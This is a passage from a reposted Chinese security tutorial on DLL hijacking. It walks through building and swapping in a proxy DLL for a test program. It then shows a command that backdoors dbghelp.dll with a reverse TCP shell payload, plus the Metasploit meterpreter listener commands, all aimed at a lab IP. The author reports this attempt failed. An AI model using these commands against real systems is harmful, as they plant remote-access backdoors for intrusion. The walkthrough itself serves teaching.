style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">7、删除vs2017在创建项目时，自动创建的dllmain.cpp，因为我们上述代码中，已经生成了该部分的引用。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">8、点击项目→配置属性→常规→字符集→设置成 使用多字节字符集</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.6145404663923183" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/12_xnbJ2yFK27fgfB0rdwroJnOkdLAEng.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4gSZnxHVSSTNZsqHj7NZG4A4pxnbJ2yFK27fgfB0rdwroJnOkdLAEng/640?wx_fmt=png'" data-type="png" data-w="1458" style="border-width: 0px;border-style: initial;border-color: initial;display: block;margin: 1rem auto;"  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">9、然后点击生成dll文件即可。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">10、然后把生成的dll文件放置到shiyan_c++的Debug目录下，并且把我们利用工具生成的dll改名为shiyan_dll.dll，把正确的dll文件改名为shiyan_dll_ys.dll。</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.3745583038869258" data-s="300,640" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/13_EtUzlKtkuLybniaYKzcWvia8d6sDnQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4yGfbgPU0d1RRC0wd4FJp0XeibEHEtUzlKtkuLybniaYKzcWvia8d6sDnQ/640?wx_fmt=png'" data-type="png" data-w="849" style=""  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">11、这时，我们双击 shiyan_c++.exe 文件。</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.5224856909239575" data-s="300,640" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/14_SmFuHxd5A5bbT5J9sicFV0nWSXnDew.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4MVXvX7eib4Oe8cHDVSVXdBibg6ZSmFuHxd5A5bbT5J9sicFV0nWSXnDew/640?wx_fmt=png'" data-type="png" data-w="1223" style=""  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5224856909239575" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/15_dkrDJfYWwOculibgLciaSQZEic0L0A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4x3rablBxquvKAgaficibokPqL1EUqdkrDJfYWwOculibgLciaSQZEic0L0A/640?wx_fmt=png'" data-type="png" data-w="1223" style="border-width: 0px;border-style: initial;border-color: initial;display: block;margin: 1rem auto;"  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">12、可以看到，成功劫持，并且劫持成功了，还继续执行了原本的函数内容（我这个中间有个小报错，选择忽略即可，毕竟C++代码没学多久，水平还待提高）。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;"><strong>0x09 其它DLL玩法</strong></span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">这个玩法还是前几天看到的，但是，我本地是测试失败（各种环境测试，是各种，唉，太菜了），不过，人家记录的是成功的，搞不懂、搞不懂、</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">文章地址1：<a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDI0MjEwMQ==&amp;mid=2247483653&amp;idx=1&amp;sn=9d9ed0cfbbb6cf56648a73ee43ff26ac&amp;scene=21#wechat_redirect" target="_blank" data-linktype="2">看我如何利用QQ反弹shell</a></span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">文章地址2：<a href="https://mp.weixin.qq.com/s?__biz=MzI2OTMzNjg4OQ==&amp;mid=2247484218&amp;idx=1&amp;sn=353fdbd41f9edbb18102c54fbbe306f0&amp;scene=21#wechat_redirect" target="_blank" data-linktype="2">看我如何利用微信反弹shell</a></span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">本机：</span><span style="font-size:15px;line-height:35px;;">win10，192.168.3.111</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">kali：</span><span style="font-size:15px;line-height:35px;;">192.168.3.137</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">winxp：</span><span style="font-size:15px;line-height:35px;;">192.168.3.134</span></p><figure class="highlight python" style="margin-top: 1em;margin-bottom: 1em;background: rgb(238, 238, 238);padding: 1em;border-radius: 2px;text-shadow: rgb(255, 255, 255) 0px 0px 1px;line-height: 1.6;overflow: auto;font-size: 0.9em;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;text-align: start;white-space: normal;"><table width="732" style="width: 654px;"><tbody><tr><td class="gutter" style="padding: 0.6em 15px 0.6em 0.6em;text-align: right;vertical-align: top;" width="20"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">1</span><br  /></pre></td><td class="code" style="padding: 0.6em 0.6em 0.6em 15px;vertical-align: top;border-left-color: rgb(255, 255, 255);color: rgb(102, 102, 102);"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">python2 backdoor.py -f shiyan/dbghelp.dll -s reverse_shell_tcp_inline -P <span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">8888</span> -H <span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">192.168.3.137</span></span><span style="color: rgb(42, 161, 152);height: 20px;font-size:15px;line-height:35px;;"></span><br  /></pre></td></tr></tbody></table></figure><figure class="highlight ruby" style="margin-top: 1em;margin-bottom: 1em;background: rgb(238, 238, 238);padding: 1em;border-radius: 2px;text-shadow: rgb(255, 255, 255) 0px 0px 1px;line-height: 1.6;overflow: auto;font-size: 0.9em;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;text-align: start;white-space: normal;"><table width="720" style="width: 654px;"><tbody><tr><td class="gutter" style="padding: 0.6em 15px 0.6em 0.6em;text-align: right;vertical-align: top;" width="20"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">1</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">2</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">3</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">4</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">5</span><br  /></pre></td><td class="code" style="padding: 0.6em 0.6em 0.6em 15px;vertical-align: top;border-left-color: rgb(255, 255, 255);color: rgb(102, 102, 102);"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">msf5 &gt; use exploit/multi/handler</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">msf5 &gt; set payload windows/meterpreter/reverse_tcp</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">msf5 &gt; set lport <span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">8888</span></span><span style="color: rgb(42, 161, 152);height: 20px;font-size:15px;line-height:35px;;"></span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">msf5 &gt; set lhost <span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">192.168</span>.<span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">3.137</span></span><span style="color: rgb(42, 161, 152);height: 20px;font-size:15px;line-height:35px;;"></span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">msf5 &gt; run</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">再来张失败的截图：</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.75" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/16_SOko6Hg2whEr5heqfjFyMaBA5ZNmVg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4EzBPpQhia6u7Qo2msmc3ibFCDjSOko6Hg2whEr5heqfjFyMaBA5ZNmVg/640?wx_fmt=png'" data-type="png" data-w="800" style="border-width: 0px;border-style: initial;border-color: initial;display: block;margin: 1rem auto;"  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;"><strong>0x10 参考文章</strong></span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:12px;line-height:32px;;">[1]</span><span style="background-color: transparent;color: rgb(240, 56, 56);font-size:12px;line-height:32px;;">https://payloads.online/archivers/2018-12-22/1</span><br  /><span style="font-size:12px;line-height:32px;;">[2]</span><span style="background-color: transparent;color: rgb(240, 56, 56);outline: 0px;font-size:12px;line-height:32px;;">https://baike.baidu.com/item/DLL%E6%96%87%E4%BB%B6/4170556</span><br  /><span style="font-size:12px;line-height:32px;;">[3]</span><span style="background-color: transparent;color: rgb(240, 56, 56);font-size:12px;line-height:32px;;">https://www.cnblogs.com/swyft/articles/5580342.html</span><br  /><span style="font-size:12px;line-height:32px;;">[4]</span><span style="background-color: transparent;color: rgb(240, 56, 56);font-size:12px;line-height:32px;;">https://blog.csdn.net/Call_Coder/article/details/79331686</span><br  /><span style="font-size:12px;line-height:32px;;">[5]</span><span style="background-color: transparent;color: rgb(240, 56, 56);font-size:12px;line-height:32px;;">http://www.mamicode.com/info-detail-1986623.html</span><br  /><span style="font-size:12px;line-height:32px;;">[6]</span><span style="background-color: transparent;color: rgb(240, 56, 56);font-size:12px;line-height:32px;;">https://blog.csdn.net/qq_15727809/article/details/83409980</span></p><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: left;"><span style="font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-variant-numeric: normal;font-variant-east-asian: normal;color: rgb(136, 136, 136);font-size:15px;line-height:35px;;"><img data-type="png" class="" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/17_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;color: rgb(81, 81, 81);text-align: center;visibility: visible !important;width: 640px !important;"  /></span><br  /></p><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;"><span style="color: rgb(136, 136, 136);font-size:12px;line-height:32px;;">参考来源:shiyan&nbsp;'s blog</span></p><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;"><span style="color: rgb(136, 136, 136);font-size:12px;line-height:32px;;">作者：shiyan</span></p><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;"><span style="color: rgb(136, 136, 136);font-size:12px;line-height:32px;;">授权转载</span><span style="color: rgb(136, 136, 136);font-size:15px;line-height:35px;;"></span></p><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><img class="rich_pages __bg_gif " data-copyright="0" data-ratio="0.5197505197505198" data-type="gif" data-w="962" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/18_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" style="visibility: visible !important;width: 677px !important;"  /></p>
                </div>
</div>
</body>
</html>